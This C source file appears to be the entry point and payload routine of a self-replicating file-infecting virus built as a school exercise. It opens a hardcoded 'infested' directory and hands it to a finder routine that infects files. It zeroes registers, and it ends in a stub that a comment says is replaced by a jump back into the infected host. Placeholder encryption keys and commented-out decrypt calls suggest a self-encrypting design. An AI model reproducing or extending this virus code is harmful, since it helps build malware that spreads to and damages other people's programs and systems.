#include "ft_virus.h"

void start(void)
{
	payload();
	EXIT(0);
}

void FORCE_INLINE set_registers()
{
	asm volatile (
		"xor rax, rax;"
		"xor rbx, rbx;"
		"xor rcx, rcx;"
		"xor esi, esi;"
		"xor edi, edi;"
		"xor r8, r8;"
		"xor r9, r9;"
		"xor r10, r10;"
		"xor r11, r11;"
		"xor r12, r12;"
		"xor r13, r13;"
		"xor r14, r14;"
		"xor r15, r15;"
		: : :
		);
}

void payload()
{
	t_data data;
	int fd;
	char hello[] = "\ndir: ";
	char payload_addr[] = "\npayload addr:";
	char infested_dir[] = INFESTED_DIR;
	u64  ret;

	fd = 0xdeadbeaf;
	ret = get_rel_addr();
	//ft_putul(ret);
	//WRITE(1, hello, sizeof(hello) - 1);
	//WRITE(1, infested_dir, sizeof(infested_dir) - 1);
	//WRITE(1, payload_addr, sizeof(payload_addr) - 1);
	//WRITE(1, ret - ((void*)&get_rel_addr - (void*)&payload), 60);
	//ft_putul(get_rel_addr() - ((void*)&get_rel_addr - (void*)&payload));
	//WRITE(1, payload_addr, 1);
	//ft_putnbr(&payload);
	data.infos.pl_size = &payload_end - &payload;
	ft_putnbr(&payload_end - &payload);
	ft_putchar('\n');
	data.key = 0xdeadbeaf;
	data.decrypt_start = 0xdeadbeaf;
	//mprotect_us();
	//decrypt();
	fd = OPEN(infested_dir, O_RDONLY | O_DIRECTORY);
	if (fd == -1)
		return ;
	finder(data, fd);
	CLOSE(fd);
	ft_putchar('2');
	ft_putchar('y');
	ft_putchar('\n');
	set_registers();
	payload_end();
}

void payload_end(void)
{
	// get replaced by the jump in inject.c
	;
}

